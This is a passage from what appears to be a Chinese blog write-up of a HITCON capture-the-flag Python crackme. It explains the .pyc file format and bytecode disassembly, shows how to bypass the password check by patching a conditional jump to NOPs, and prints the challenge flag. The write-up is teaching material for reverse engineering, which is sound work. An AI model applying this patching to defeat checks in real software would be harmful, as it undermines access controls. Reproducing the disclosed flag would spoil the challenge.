class="hljs-string">'eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ=='</span>)</span><br><span class="line">zd = zlib.decompress(b64d)</span><br><span class="line">ml = marshal.loads(zd)</span><br><span class="line"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'crackme.pyc'</span>,<span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">    f.write(imp.get_magic() + <span class="hljs-string">b'\0'</span> * <span class="hljs-number">4</span> + zd)</span><br></pre></td></tr></tbody></table></figure><p>具体写入的内容是什么在后面介绍。</p><h4 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h4><p><em>PyCodeObject</em>定义如下</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span></span><br><span class="line">    PyObject_HEAD</span><br><span class="line">    <span class="hljs-keyword">int</span> co_argcount;        <span class="hljs-comment">/* #arguments, except *args */</span></span><br><span class="line">    <span class="hljs-keyword">int</span> co_nlocals;     <span class="hljs-comment">/* #local variables */</span></span><br><span class="line">    <span class="hljs-keyword">int</span> co_stacksize;       <span class="hljs-comment">/* #entries needed for evaluation stack */</span></span><br><span class="line">    <span class="hljs-keyword">int</span> co_flags;       <span class="hljs-comment">/* CO_..., see below */</span></span><br><span class="line">    PyObject *co_code;      <span class="hljs-comment">/* instruction opcodes */</span></span><br><span class="line">    PyObject *co_consts;    <span class="hljs-comment">/* list (constants used) */</span></span><br><span class="line">    PyObject *co_names;     <span class="hljs-comment">/* list of strings (names used) */</span></span><br><span class="line">    PyObject *co_varnames;  <span class="hljs-comment">/* tuple of strings (local variable names) */</span></span><br><span class="line">    PyObject *co_freevars;  <span class="hljs-comment">/* tuple of strings (free variable names) */</span></span><br><span class="line">    PyObject *co_cellvars;      <span class="hljs-comment">/* tuple of strings (cell variable names) */</span></span><br><span class="line">    <span class="hljs-comment">/* The rest doesn't count for hash/cmp */</span></span><br><span class="line">    PyObject *co_filename;  <span class="hljs-comment">/* string (where it was loaded from) */</span></span><br><span class="line">    PyObject *co_name;      <span class="hljs-comment">/* string (name, for reference) */</span></span><br><span class="line">    <span class="hljs-keyword">int</span> co_firstlineno;     <span class="hljs-comment">/* first source line number */</span></span><br><span class="line">    PyObject *co_lnotab;    <span class="hljs-comment">/* string (encoding addr&lt;-&gt;lineno mapping) */</span></span><br><span class="line">} PyCodeObject;</span><br></pre></td></tr></tbody></table></figure><p>以本题为例</p><figure class="highlight tap hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt; hexdump -C crackme.pyc </span><br><span class="line">00000000 <span class="hljs-number"> 03 </span>f3 0d 0a<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 <span class="hljs-number"> 63 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  |........c.......|</span><br><span class="line">00000010 <span class="hljs-number"> 00 </span>02<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>40<span class="hljs-number"> 00 </span>00 <span class="hljs-number"> 00 </span>73<span class="hljs-number"> 23 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 64 </span>01  |.....@...s<span class="hljs-comment">#...d.|</span></span><br><span class="line">00000020 <span class="hljs-number"> 00 </span>84<span class="hljs-number"> 00 </span>00 5a<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 65 </span><span class="hljs-number"> 01 </span>00<span class="hljs-number"> 64 </span>02<span class="hljs-number"> 00 </span>6b<span class="hljs-number"> 02 </span>00  |....Z..e..d..k..|</span><br><span class="line">00000030 <span class="hljs-number"> 72 </span>1f<span class="hljs-number"> 00 </span>65<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 83 </span>00 <span class="hljs-number"> 00 </span>01 6e<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 64 </span>00<span class="hljs-number"> 00 </span> |r..e......n..d..|</span><br><span class="line">00000040  53</span><br></pre></td></tr></tbody></table></figure><p>首先几个字节是文件头，首先的四个字节是 <code>MagicNumber</code> ， 接下来的四个字节是 <code>时间戳</code> ，采用<code>小端序</code>，不过写入的都是0，也无所谓，和<code>PE</code>文件格式里的时间一样，这一项实际上并没有什么用，这里对应的是之前写入的<code>imp.get_magic() + b'\0' * 4</code>，只有包含这样的文件头才是一个合法的<code>pyc</code>文件。</p><p>后面是 <code>PyCodeObject</code> 。首先会有一个 <code>TYPE_CODE</code> ， 这里是字符 ， 所以是 <code>C</code> ， 即<code>0x63</code> 。后面是参数个数 <code>co_argcount</code> ， 局部变量个数 <code>co_nlocals</code> ， 栈空间 <code>co_stacksize</code> ， 和 <code>co_flags</code> ，每项均占用4个字节。</p><p>我们可以解析出来这样的一个结构（需要注意是小端序）</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">magic</span> <span class="hljs-number">03</span>f<span class="hljs-number">30</span>d<span class="hljs-number">0</span>a</span><br><span class="line"><span class="hljs-attribute">moddate</span> <span class="hljs-number">00000000</span> (Thu Jan  <span class="hljs-number">1</span> <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-number">1970</span>)</span><br><span class="line"><span class="hljs-attribute">code</span></span><br><span class="line">   <span class="hljs-attribute">argcount</span> <span class="hljs-number">0</span></span><br><span class="line">   <span class="hljs-attribute">nlocals</span> <span class="hljs-number">0</span></span><br><span class="line">   <span class="hljs-attribute">stacksize</span> <span class="hljs-number">2</span></span><br><span class="line">   <span class="hljs-attribute">flags</span> <span class="hljs-number">0040</span></span><br><span class="line">   <span class="hljs-attribute">code</span></span><br><span class="line">      <span class="hljs-attribute">6401008400005a00006501006402006b0200721f00650000830000016e00</span></span><br><span class="line">      <span class="hljs-attribute">0064000053</span></span><br></pre></td></tr></tbody></table></figure><p><code>co_flags</code>后面是<code>co_code</code>，把它单独拿出来，因为它也有一些自己的结构</p><h5 id="co-code"><a href="#co-code" class="headerlink" title="co_code"></a>co_code</h5><p>同样先是 <code>TYPE_CODE</code> , 类型标识 ， 这里是 <code>s</code> ， 即 <code>0x73</code> 。后面的四个字节用来标识指令的 <code>长度</code> ， 这里是 <code>0x23</code> 。紧跟在后面的是具体的字节码，包含<code>指令</code>和<code>操作数</code>，有些指令是没有操作数的，指令占用一个字节，操作数占用两个字节，字节码和指令的对应关系和指令的作用可以查阅<a href="https://rycbar.xyz/2020/03/13/python-opcode/">这篇文章</a>或者直接去查阅<code>dis</code>的手册。</p><blockquote><p>给出链接</p><p><a href="https://docs.python.org/2/library/dis.html">https://docs.python.org/2/library/dis.html</a></p><p><a href="https://github.com/python/cpython/blob/master/Include/opcode.h">https://github.com/python/cpython/blob/master/Include/opcode.h</a></p></blockquote><p>用<code>dis</code>模块来解析一下这段字节码</p><figure class="highlight tap hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1          <span class="hljs-number"> 0 </span>LOAD_CONST              <span class="hljs-number"> 1 </span>(&lt;code object main at 0000000003656E30, file "&lt;string&gt;", line 1&gt;)</span><br><span class="line">           <span class="hljs-number"> 3 </span>MAKE_FUNCTION            0</span><br><span class="line">           <span class="hljs-number"> 6 </span>STORE_NAME              <span class="hljs-number"> 0 </span>(main)</span><br><span class="line"></span><br><span class="line">4          <span class="hljs-number"> 9 </span>LOAD_NAME               <span class="hljs-number"> 1 </span>(__name__)</span><br><span class="line">          <span class="hljs-number"> 12 </span>LOAD_CONST              <span class="hljs-number"> 2 </span>('__main__')</span><br><span class="line">          <span class="hljs-number"> 15 </span>COMPARE_OP              <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">          <span class="hljs-number"> 18 </span>POP_JUMP_IF_FALSE       31</span><br><span class="line"></span><br><span class="line">5         <span class="hljs-number"> 21 </span>LOAD_NAME               <span class="hljs-number"> 0 </span>(main)</span><br><span class="line">          <span class="hljs-number"> 24 </span>CALL_FUNCTION            0</span><br><span class="line">          <span class="hljs-number"> 27 </span>POP_TOP</span><br><span class="line">          <span class="hljs-number"> 28 </span>JUMP_FORWARD            <span class="hljs-number"> 0 </span>(to 31)</span><br><span class="line">      &gt;&gt;  <span class="hljs-number"> 31 </span>LOAD_CONST              <span class="hljs-number"> 0 </span>(None)</span><br><span class="line">          <span class="hljs-number"> 34 </span>RETURN_VALUE</span><br></pre></td></tr></tbody></table></figure><p>第一列数字是这个代码块在源码中的行数 ， 第二列数字表示该指令在 <code>co_code</code> 中的偏移 ， 第三列表示具体操作 ， 第四列是操作数。 </p><p>这道题目可以看出来又调用了一个<em>PyCodeObject</em>，这个在后面在分析，先关注一个问题，这个</p><p><em>PyCodeObject</em>是通过<code>LOAD_CONST</code>指令调用的，是储存在co_const中的常量</p><h5 id="co-const"><a href="#co-const" class="headerlink" title="co_const"></a>co_const</h5><p>既然单拉出来就说明它也有自己的结构</p><p>每一项都是以<code>0x28</code> 开头，为 <code>TYPE_TUPLE</code>， 即 <code>'('</code> 。接下来的四个字节为元素个数，这里是<code>0x03</code>。</p><figure class="highlight stylus hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="hljs-selector-tag">code</span><span class="hljs-selector-class">.co_consts</span></span><br><span class="line">(None, &lt;<span class="hljs-selector-tag">code</span> <span class="hljs-selector-tag">object</span> <span class="hljs-selector-tag">main</span> at <span class="hljs-number">0</span>x7fa4909ea530, file <span class="hljs-string">"&lt;string&gt;"</span>, line <span class="hljs-number">1</span>&gt;, <span class="hljs-string">'__main__'</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><p>后面为<code>co_names</code>，标识<code>0x28</code>，接着四个字节为元素个数 ， 然后字符类型 ， 字符内容。</p><p><code>co_varnames</code> , <code>co_freevars</code> , <code>co_cellvars</code> 结构与上面相同。</p><p>然后是<code>co_filename</code>，标识类型，路径长度 ，路径 。</p><p>然后是<code>co_name</code>，同样是标识类型，长度，内容。</p><p><code>co_firstlineno</code>，这里为<code>0x01</code> 。</p><p>字节码指令与源文件行号对应关系储存在<code>co_lnotab</code>，同样是标识类型，四字节长度，内容。</p><p>这是文件对应的信息（<code>const</code>去掉了<code>None</code>）</p><figure class="highlight plaintext hljs"><figcaption><span>('main', '__name__')</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">names ('main', '__name__')</span><br><span class="line">varnames ()</span><br><span class="line">freevars ()</span><br><span class="line">cellvars ()</span><br><span class="line">filename '&lt;string&gt;'</span><br><span class="line">name '&lt;module&gt;'</span><br><span class="line">firstlineno 1</span><br><span class="line">lnotab 000009030c01</span><br></pre></td></tr></tbody></table></figure><p><code>pyc</code>文件格式的粗略解析就差不多了，可以看出来比<code>ELF</code>，<code>PE</code>都要简单得多。</p><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>前面看到，本题还有一个<em>PyCodeObject</em> <em>main</em>是主要操作，所以用上面的方法再来解析一下<code>main</code>函数（太长了，就不全放出来了）</p><p>主要关注输入操作</p><figure class="highlight tap hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">737 LOAD_CONST              <span class="hljs-number"> 0 </span>(None)</span><br><span class="line">740 NOP                 </span><br><span class="line">        <span class="hljs-number"> 741 </span>JUMP_ABSOLUTE          759</span><br><span class="line">     &gt;&gt; <span class="hljs-number"> 744 </span>LOAD_GLOBAL             <span class="hljs-number"> 1 </span>(raw_input)</span><br><span class="line">        <span class="hljs-number"> 747 </span>JUMP_ABSOLUTE         1480</span><br><span class="line">     &gt;&gt; <span class="hljs-number"> 750 </span>LOAD_FAST               <span class="hljs-number"> 0 </span>(password)</span><br><span class="line">        <span class="hljs-number"> 753 </span>COMPARE_OP              <span class="hljs-number"> 2 </span>(==)</span><br><span class="line">        <span class="hljs-number"> 756 </span>JUMP_ABSOLUTE          767</span><br><span class="line">     &gt;&gt; <span class="hljs-number"> 759 </span>ROT_TWO             </span><br><span class="line">        <span class="hljs-number"> 760 </span>STORE_FAST              <span class="hljs-number"> 0 </span>(password)</span><br><span class="line">        <span class="hljs-number"> 763 </span>POP_TOP             </span><br><span class="line">        <span class="hljs-number"> 764 </span>JUMP_ABSOLUTE          744</span><br><span class="line">     &gt;&gt; <span class="hljs-number"> 767 </span>POP_JUMP_IF_FALSE     1591</span><br><span class="line">        <span class="hljs-number"> 770 </span>LOAD_GLOBAL             <span class="hljs-number"> 0 </span>(chr)</span><br><span class="line">        <span class="hljs-number"> 773 </span>LOAD_CONST             <span class="hljs-number"> 17 </span>(99)</span><br></pre></td></tr></tbody></table></figure><p>发现这里只是经过一个简单的比较，完全可以<code>bypass</code>，以16进制打开，修改<code>POP_JUMP_IF_FALSE     1591</code>成<code>nop</code>就可以了</p><p>所以开始查表<code>POP_JUMP_IF_FALSE</code>对应的值为<code>114</code>（0x72），<code>1591</code>（0x637）is <code>\x37\x06</code> （小端序）</p><p>所以要查找<code>72 37 06</code> ，<code>nop</code>对应的值为<code>09</code>，所以需要改成<code>09 09 09</code></p><p>然后直接运行，输入任何值都可以输出flag</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-&gt; ./crackme.pyc </span><br><span class="line">password: 0</span><br><span class="line">hitcon{Now you can compile and run Python bytecode <span class="hljs-keyword">in</span> your brain!}</span><br></pre></td></tr></tbody></table></figure><p>当然也可以逐步分析</p><figure class="highlight tap hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; <span class="hljs-number"> 767 </span>POP_JUMP_IF_FALSE     1591</span><br><span class="line">770 LOAD_GLOBAL             <span class="hljs-number"> 0 </span>(chr)</span><br><span class="line">         <span class="hljs-number"> 773 </span>LOAD_CONST             <span class="hljs-number"> 17 </span>(99)</span><br><span class="line">         <span class="hljs-number"> 776 </span>CALL_FUNCTION            1</span><br><span class="line">         <span class="hljs-number"> 779 </span>LOAD_GLOBAL             <span class="hljs-number"> 0 </span>(chr)</span><br><span class="line">         <span class="hljs-number"> 782 </span>LOAD_CONST             <span class="hljs-number"> 10 </span>(116)</span><br><span class="line">         <span class="hljs-number"> 785 </span>CALL_FUNCTION            1</span><br><span class="line">         <span class="hljs-number"> 788 </span>LOAD_GLOBAL             <span class="hljs-number"> 0 </span>(chr)</span><br><span class="line">         <span class="hljs-number"> 791 </span>LOAD_CONST             <span class="hljs-number"> 14 </span>(105)</span><br><span class="line">         <span class="hljs-number"> 794 </span>CALL_FUNCTION            1</span><br><span class="line">         <span class="hljs-number"> 797 </span>LOAD_GLOBAL             <span class="hljs-number"> 0 </span>(chr)</span><br><span class="line">         <span class="hljs-number"> 800 </span>LOAD_CONST              <span class="hljs-number"> 9 </span>(104)</span><br><span class="line">         <span class="hljs-number"> 803 </span>CALL_FUNCTION            1</span><br><span class="line">         <span class="hljs-number"> 806 </span>ROT_TWO</span><br><span class="line">         <span class="hljs-number"> 807 </span>BINARY_ADD</span><br><span class="line">         <span class="hljs-number"> 808 </span>ROT_TWO</span><br><span class="line">         <span class="hljs-number"> 809 </span>BINARY_ADD</span><br><span class="line">         <span class="hljs-number"> 810 </span>ROT_TWO</span><br><span class="line">         <span class="hljs-number"> 811 </span>BINARY_ADD</span><br></pre></td></tr></tbody></table></figure><p>这是后面的一部分操作，分析一下，调用<code>chr()</code>函数，把存储的几个数字转成字符，此时的栈</p><figure class="highlight brainfuck hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">high</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'c'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'t'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'i'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'h'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br></pre></td></tr></tbody></table></figure><p>执行一次<code>ROT_TWO</code>，栈顶两个元素换位，然后<code>BINARY_ADD</code>，经过几次，然后进行下一组</p><figure class="highlight brainfuck hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">high</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">||</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">high</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">||</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">high</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'c'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">||</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'c'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">||</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'hitc'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'t'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">||</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'t'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">||</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'i'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">||</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'hi'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">'h'</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">||</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br><span class="line"><span class="hljs-comment">|</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">|</span></span><br></pre></td></tr></tbody></table></figure><p>大概的变化过程就是这样，仔细分析，每四个字符一组，每组做一个倒序处理</p><p>然后跳转到最后</p><figure class="highlight tap hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;<span class="hljs-number"> 2212 </span>PRINT_ITEM</span><br><span class="line">        <span class="hljs-number"> 2213 </span>PRINT_NEWLINE</span><br><span 